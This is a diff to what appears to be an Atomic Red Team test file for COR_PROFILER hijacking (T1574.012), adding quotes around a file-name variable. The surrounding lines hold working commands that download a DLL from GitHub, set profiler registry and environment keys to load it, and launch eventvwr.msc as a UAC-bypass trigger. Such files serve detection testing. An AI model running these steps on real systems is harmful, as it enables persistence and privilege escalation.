@@ -25,19 +25,19 @@ atomic_tests:
   dependency_executor_name: powershell
   dependencies:
   - description: |
-      #{file_name} must be present
+      "#{file_name}" must be present
     prereq_command: |
-      if (Test-Path #{file_name}) {exit 0} else {exit 1}
+      if (Test-Path "#{file_name}") {exit 0} else {exit 1}
     get_prereq_command: |
-      New-Item -Type Directory (split-path #{file_name}) -ErrorAction ignore | Out-Null
+      New-Item -Type Directory (split-path "#{file_name}") -ErrorAction ignore | Out-Null
       Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1574.012/bin/T1574.012x64.dll" -OutFile "#{file_name}"
   executor:
     command: |
       Write-Host "Creating registry keys in HKCU:Software\Classes\CLSID\#{clsid_guid}" -ForegroundColor Cyan
-      New-Item -Path "HKCU:\Software\Classes\CLSID\#{clsid_guid}\InprocServer32" -Value #{file_name} -Force | Out-Null
+      New-Item -Path "HKCU:\Software\Classes\CLSID\#{clsid_guid}\InprocServer32" -Value "#{file_name}" -Force | Out-Null
       New-ItemProperty -Path HKCU:\Environment -Name "COR_ENABLE_PROFILING" -PropertyType String -Value "1" -Force | Out-Null
       New-ItemProperty -Path HKCU:\Environment -Name "COR_PROFILER" -PropertyType String -Value "#{clsid_guid}" -Force | Out-Null
-      New-ItemProperty -Path HKCU:\Environment -Name "COR_PROFILER_PATH" -PropertyType String -Value #{file_name} -Force | Out-Null
+      New-ItemProperty -Path HKCU:\Environment -Name "COR_PROFILER_PATH" -PropertyType String -Value "#{file_name}" -Force | Out-Null
       Write-Host "executing eventvwr.msc" -ForegroundColor Cyan
       START MMC.EXE EVENTVWR.MSC
     cleanup_command: |
@@ -69,18 +69,18 @@ atomic_tests:
   dependency_executor_name: powershell
   dependencies:
   - description: |
-      #{file_name} must be present
+      "#{file_name}" must be present
     prereq_command: |
-      if (Test-Path #{file_name}) {exit 0} else {exit 1}
+      if (Test-Path "#{file_name}") {exit 0} else {exit 1}
     get_prereq_command: |
-      New-Item -Type Directory (split-path #{file_name}) -ErrorAction ignore | Out-Null
+      New-Item -Type Directory (split-path "#{file_name}") -ErrorAction ignore | Out-Null
       Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1574.012/bin/T1574.012x64.dll" -OutFile "#{file_name}"
   executor:
     command: |
       Write-Host "Creating system environment variables" -ForegroundColor Cyan
       New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_ENABLE_PROFILING" -PropertyType String -Value "1" -Force | Out-Null
       New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_PROFILER" -PropertyType String -Value "#{clsid_guid}" -Force | Out-Null
-      New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_PROFILER_PATH" -PropertyType String -Value #{file_name} -Force | Out-Null
+      New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_PROFILER_PATH" -PropertyType String -Value "#{file_name}" -Force | Out-Null
     cleanup_command: |
       Remove-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_ENABLE_PROFILING" -Force -ErrorAction Ignore | Out-Null
       Remove-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_PROFILER" -Force -ErrorAction Ignore | Out-Null
@@ -107,17 +107,17 @@ atomic_tests:
   dependency_executor_name: powershell
   dependencies:
   - description: |
-      #{file_name} must be present
+      "#{file_name}" must be present
     prereq_command: |
-      if (Test-Path #{file_name}) {exit 0} else {exit 1}
+      if (Test-Path "#{file_name}") {exit 0} else {exit 1}
     get_prereq_command: |
-      New-Item -Type Directory (split-path #{file_name}) -ErrorAction ignore | Out-Null
+      New-Item -Type Directory (split-path "#{file_name}") -ErrorAction ignore | Out-Null
       Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1574.012/bin/T1574.012x64.dll" -OutFile "#{file_name}"
   executor:
     command: |
       $env:COR_ENABLE_PROFILING = 1
       $env:COR_PROFILER = '#{clsid_guid}'
-      $env:COR_PROFILER_PATH = '#{file_name}'
+      $env:COR_PROFILER_PATH = '"#{file_name}"'
       POWERSHELL -c 'Start-Sleep 1'
     cleanup_command: |
       $env:COR_ENABLE_PROFILING = 0
